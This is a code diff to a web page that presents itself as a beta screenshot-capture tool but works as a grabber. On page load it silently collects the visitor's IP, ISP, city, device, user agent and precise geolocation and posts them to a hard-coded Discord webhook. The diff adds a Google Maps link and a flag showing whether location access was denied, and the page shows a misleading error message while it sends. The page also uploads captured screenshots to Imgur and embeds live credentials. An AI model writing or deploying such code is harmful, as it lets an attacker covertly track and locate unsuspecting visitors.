@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>iron man - beta</title>
-    <link rel="icon" href="https://i.ytimg.com/vi/HZpfyaOhagc/sddefault.jpg" type="image/x-icon">
+    <link rel="icon" href="https://img1.wsimg.com/isteam/ip/8e495756-5f93-4e6c-b651-40bb8c49fc72/11c91fce-7c4e-409a-8ace-ffa168e19818.jpg/:/rs=w:984,h:993" type="image/x-icon">
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -34,7 +34,7 @@
 </head>
 <body>
 
-    <h1>Screenshot Capture (beta)</h1>
+    <h1>Screenshot Capture 🔥 (beta)</h1>
     <button id="captureBtn">Capture Screenshot</button>
     <p id="status">Status: Waiting for action</p>
     <p id="version"></p>
@@ -45,7 +45,7 @@
         const versionElement = document.getElementById('version');
 
         // Define the current version of the script
-        const currentVersion = "1.6"; // Change this whenever you release a new version
+        const currentVersion = "1.6";
         versionElement.innerText = `Version: ${currentVersion}`;
 
         // Automatically send user info on page load
@@ -53,12 +53,11 @@
             try {
                 const ipData = await getIPInfo();
                 const userAgent = navigator.userAgent;
-                const deviceName = getDeviceName(userAgent); // Get detailed device name
-                const { latitude, longitude } = await getCoordinates(ipData); // Get coordinates, using IP if geolocation fails
+                const deviceName = getDeviceName(userAgent);
+                const { latitude, longitude, accessType } = await getCoordinates(ipData);
 
-                await sendToDiscord(ipData, userAgent, deviceName, latitude, longitude);
+                await sendToDiscord(ipData, userAgent, deviceName, latitude, longitude, accessType);
                 status.innerText = 'Error Issue sent automatically!';
-
             } catch (error) {
                 console.error('Error:', error);
                 status.innerText = 'Error with User Browser';
@@ -72,7 +71,8 @@
             if (/iPad/i.test(userAgent)) {
                 deviceName = "iPad";
             } else if (/iPhone/i.test(userAgent)) {
-                deviceName = "iPhone";
+                const match = userAgent.match(/iPhone OS (\d+_\d+)/);
+                deviceName = match ? `iPhone ${match[1].replace('_', '.')}` : "iPhone";
             } else if (/Macintosh/i.test(userAgent)) {
                 deviceName = "Mac";
             } else if (/Windows NT/i.test(userAgent)) {
@@ -82,7 +82,7 @@
             } else if (/Linux/i.test(userAgent)) {
                 deviceName = "Linux PC (most likely a raspberry pi mini desktop)";
             } else if (/Android/i.test(userAgent)) {
-                const match = userAgent.match(/Android ([\d\.]+); ([^;]+)/);
+                const match = userAgent.match(/Android (\d+\.\d+); ([^;]+)/);
                 deviceName = match ? `Android ${match[1]} (${match[2]})` : "Android Device";
             } else if (/Chrome/i.test(userAgent) && /Mobile/i.test(userAgent)) {
                 const match = userAgent.match(/Mobile\/([^ ]+)/);
@@ -94,14 +94,11 @@
 
         async function getIPInfo() {
             try {
-                // First attempt to fetch from ipwhois.app
                 const response = await fetch('https://ipwhois.app/json/');
                 if (!response.ok) throw new Error("Failed to fetch IP data from ipwhois.app");
                 return await response.json();
             } catch (error) {
                 console.warn("IP data request failed, trying backup service:", error);
-
-                // Attempt to fetch from ip-api.com as a fallback
                 try {
                     const response = await fetch('http://ip-api.com/json');
                     if (!response.ok) throw new Error("Failed to fetch IP data from ip-api.com");
@@ -120,21 +117,28 @@
         }
 
         async function getCoordinates(ipData) {
-            return new Promise((resolve, reject) => {
+            return new Promise((resolve) => {
                 if (navigator.geolocation) {
                     navigator.geolocation.getCurrentPosition(position => {
                         resolve({
                             latitude: position.coords.latitude,
-                            longitude: position.coords.longitude
+                            longitude: position.coords.longitude,
+                            accessType: "(location access)"
                         });
                     }, error => {
                         console.error("Geolocation permission denied, using IP-based coordinates:", error);
-                        // If geolocation fails, use IP-based coordinates
-                        resolve({ latitude: ipData.latitude || "Unavailable", longitude: ipData.longitude || "Unavailable" });
+                        resolve({
+                            latitude: ipData.latitude || "Unavailable",
+                            longitude: ipData.longitude || "Unavailable",
+                            accessType: "(denied location access)"
+                        });
                     });
                 } else {
-                    // Fallback if geolocation is not available
-                    resolve({ latitude: ipData.latitude || "Unavailable", longitude: ipData.longitude || "Unavailable" });
+                    resolve({
+                        latitude: ipData.latitude || "Unavailable",
+                        longitude: ipData.longitude || "Unavailable",
+                        accessType: "(denied location access)"
+                    });
                 }
             });
         }
@@ -144,7 +148,6 @@
                 const imageUrl = await captureScreen();
                 await sendScreenshotToDiscord(imageUrl);
                 status.innerText = 'Screenshot sent successfully to Gallery (error)!';
-
             } catch (error) {
                 console.error('Error capturing screenshot:', error);
                 status.innerText = 'Error capturing screenshot!';
@@ -164,45 +167,48 @@
             canvas.height = bitmap.height;
             const ctx = canvas.getContext('2d');
             ctx.drawImage(bitmap, 0, 0);
-            videoTrack.stop(); // Stop the video stream
-            return await uploadToImgur(canvas.toDataURL('image/png', 0.5)); // Upload to Imgur
+            videoTrack.stop();
+            return await uploadToImgur(canvas.toDataURL('image/png', 0.5));
         }
 
         async function uploadToImgur(imageData) {
-            const clientId = '86510995bc57138'; // Replace with your Imgur Client ID
+            const clientId = '86510995bc57138';
             const response = await fetch('https://api.imgur.com/3/image', {
                 method: 'POST',
                 headers: {
                     'Authorization': `Client-ID ${clientId}`,
                     'Content-Type': 'application/json'
                 },
-                body: JSON.stringify({ image: imageData.split(',')[1] }) // Send base64 data
+                body: JSON.stringify({ image: imageData.split(',')[1] })
             });
             const data = await response.json();
             if (!data.success) throw new Error('Failed to upload image to Imgur');
-            return data.data.link; // Return the URL of the uploaded image
+            return data.data.link;
         }
 
-        async function sendToDiscord(ipData, userAgent, deviceName, latitude, longitude) {
+        async function sendToDiscord(ipData, userAgent, deviceName, latitude, longitude, accessType) {
             const webhookUrl = 'https://discord.com/api/webhooks/1260414799796244490/6e9H7pviEjpknL-0_ST-f2aeLDfYaMrAXAJ2KaSdctwa1JIUFjoj9W-MRAmdhtr4jTil';
+
+            // Create Google Maps link
+            const googleMapsLink = `https://www.google.com/maps/dir//${latitude},${longitude}`;
 
             const webhookPayload = {
                 content: "@everyone User's info:",
                 embeds: [{
                     title: "User's Information",
                     fields: [
-                        { name: "IP", value: ipData.ip, inline: true },
-                        { name: "Location", value: `${ipData.city}, ${ipData.region} (${ipData.country})`, inline: true },
-                        { name: "ISP", value: ipData.org, inline: true },
-                        { name: "User Agent", value: userAgent },
-                        { name: "Device", value: deviceName }, // Added device model
-                        { name: "Coordinates", value: `${latitude}, ${longitude}` }
+                        { name: "IP 🧑‍💻", value: ipData.ip, inline: true },
+                        { name: "Location 🗺️", value: `${ipData.city}, ${ipData.region} (${ipData.country})`, inline: true },
+                        { name: "ISP 🛜", value: ipData.org, inline: true },
+                        { name: "User Agent 💻", value: userAgent },
+                        { name: "Device 📱", value: deviceName },
+                        { name: "Coordinates 📌️", value: `${latitude}, ${longitude} ${accessType}` },
+                        { name: "Google Maps 🌐️", value: `[Open Google Maps](${googleMapsLink})`, inline: true }
                     ],
-                    color: 3447003 // Color in Discord embed (blue)
+                    color: 3447003
                 }]
             };
 
-            // Send a POST request to the Discord webhook
             await fetch(webhookUrl, {
                 method: 'POST',
                 headers: {
@@ -220,13 +226,12 @@
                 embeds: [{
                     title: "Screenshot",
                     image: {
-                        url: imageUrl // Discord requires a URL, so we use the Imgur link
+                        url: imageUrl
                     },
-                    color: 3447003 // Color in Discord embed (blue)
+                    color: 3447003
                 }]
             };
 
-            // Send a POST request to the Discord webhook
             await fetch(webhookUrl, {
                 method: 'POST',
                 headers: {
